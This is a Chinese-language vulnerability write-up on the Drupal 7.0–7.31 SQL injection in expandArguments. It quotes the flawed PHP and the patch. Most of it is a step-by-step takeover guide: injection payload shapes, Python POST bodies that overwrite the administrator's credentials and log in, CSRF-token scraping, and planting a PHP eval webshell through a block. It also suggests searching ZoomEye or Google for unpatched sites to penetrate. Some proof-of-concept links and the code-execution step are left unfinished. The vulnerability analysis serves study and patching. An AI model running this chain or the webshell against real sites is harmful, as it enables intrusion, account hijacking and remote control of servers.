#Drupal 7.0-7.31漏洞分析报告
@(技术笔记)[漏洞 | web安全 | 工作]
## Drupal 简介 ##
----
**Drupal**是一个开源的CMS系统.他的编写语言是**PHP**.Drupal在互联网中被广泛使用.

## Drupal 漏洞简介 ##
----
### 漏洞用途 ###

但是在Drupal最近发布的新版本7.31中，被暴露出一个非常严重的漏洞...
因为被广泛应用.所以这个漏洞的风险级别非常的高,可以用来:
1. **获取管理员用户名和密码**
2. **修改覆盖超级管理员用户名和密码**
3. **获取webshell以及反弹shell,**
4. **远程代码执行**

等等.

### 漏洞原理 ###
----
**漏洞的主要原因:**
在某个和数据库交互的函数中,传入参数默认没有key,只有value.从而导致当传入参数有key的时候,key内可以注入sql语句.

---
**代码分析:**
产生漏洞的函数位于:`./drupal/includes/database/database.inc`中
`line:732`
`function name:expandArguments`

```php
 //被db_query函数在数据库查询的时候调用
  protected function expandArguments(&$query, &$args) {
    $modified = FALSE;
    foreach (array_filter($args, 'is_array') as $key => $data) {
      $new_keys = array();
      foreach ($data as $i => $value) {   
      //这里的$i为key.默认是没有的,用1,2,3来替代
        $new_keys[$key . '_' . $i] = $value;
      //所以正常情况下new_keys的key为$key._.1 / $key._.2等等.
      }    
      $query = preg_replace('#' . $key . '\b#', implode(', ', array_keys($new_keys)), $query);
      unset($args[$key]);
      $args += $new_keys;

      $modified = TRUE;
    }

    return $modified;
  }
```
代码中的`$data`在迭代的时候key和value被分别赋值给`$i`和`$value`，但是默认没有`$i`,所以`$i`的默认值将为1,2,3,4.....
所以`$new_keys`的key为`$keys._.1/2/3`
**但是**当`$i`有值的时候就会变成`$keys._.$i`，此时`$i`是可以被传值和操作的,**安全隐患**由此而来

------
**漏洞利用方法**
传入参数`$args`可以是如下值:
`array(':name'=>array('test; -- ' => 'user1','test' => 'user2'))`
`array(':name'=>array('test; insert ... ;-- ' => 'user1','test' => 'user2'))`
`array(':name'=>array('test; select ... ;-- ' => 'user1','test' => 'user2'))`
`array(':name'=>array('test; update ... ;-- ' => 'user1','test' => 'user2'))`

------
**漏洞入口**
管理员登陆的请求包中附加两个特地构造的字典(map)即可。如下:
```python
name['test; update....;--'] = "random"
name['test'] = "random"
```
---
**可利用资源**
1. **数据表字段**已知(下载当前版本安装在本地即可得之)
2. **源码**已知,导致密码加密方式已知,并可以直接利用或者重写
3. **版本**已知,可以使用ZoomEye或者Google查找相应未打上补丁的机器进行渗透


###漏洞利用实例###

1. ***覆盖超级管理员,修改用户名和密码***
   这一步需要构造一个post请求发送给目标主机.post的内容为:
   ```python
   #具体update的内容请查看相应的users表字段,一般为name,pass字段
get_admin_data = {
            "name['test; update....;--']" : "random",
            "name['test']" : "random",
            "pass" : "random",
            "op": "Log+in",
}
   ```
然后post出去即可
**注意:**
update的pass字段需要是已经加密好的密码,所以请先使用Drupal自带的加密文件(`./drupal/includes/password.inc`)得到你要设置的密码加密结果.
**POC请访问:**#TODO
2. ***超级管理员登陆***
这一步建立在上一步的基础上,此时需要发送登陆的post包过去...包括一下几个主要内容:
```python
log_in_data = {  
                        'name':'random', 
                        'pass':'random',  
                         #这个是csrf的token,需要通过一个get请求获得
                        'form_build_id':form_build_id,
                        'form_id':'user_login_block',  
                        'op':'Log+in'  
                    }  
```
**注意:**关键是cstf的token获得
```python
 pattern = re.compile(r'name="form_build_id" value="(.+)"')  
 token_content = requests.get(url)  
 form_build_id = pattern.findall(token_content.content)[0]
```
**POC请访问**:#TODO
3. ***上传webshell***
首先使用cookie登陆.
url为:`?q=admin/structure/block/add`
通过抓包来得到发表文章的request的形式,构造发布一个文章的request请求,
 `content_body = "<?php @eval($_POST['cmd']);?>"`
除此之外还要获得csrf的token和id.方法同上一步.
```python
shell_data = {  
            'title':'',  
            'info':'shit2',  
            'body[value]':content,  
            'body[format]':'php_code',  
            'regions[bartik]':'-1',  
            'regions[seven]':'-1',  
            'visibility':'0',  
            'pages':'',  
            'custom':'0',  
            'visibility__active_tab':'edit-path',  
            'form_build_id':form_build_id,  
            'form_token':form_token,  
            'form_id':'block_add_block_form',  
            'op':'Save+block'  
        }  
```
**POC请访问:**#TODO
4. ***远程代码执行***
TODO

###Patch###
```php
$new_keys = array();
    foreach (array_values($data) as $i => $value) {
      $new_keys[$key . '_' . $i] = $value;
    }
```
###注意事项###
此报告中包含的代码不得用于恶意用途....仅供交流使用.
###参考文章###
https://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html
https://www.sektioneins.de/en/blog/14-11-03-drupal-sql-injection-vulnerability-PoC.html
http://blog.csdn.net/u011721501/article/details/40347679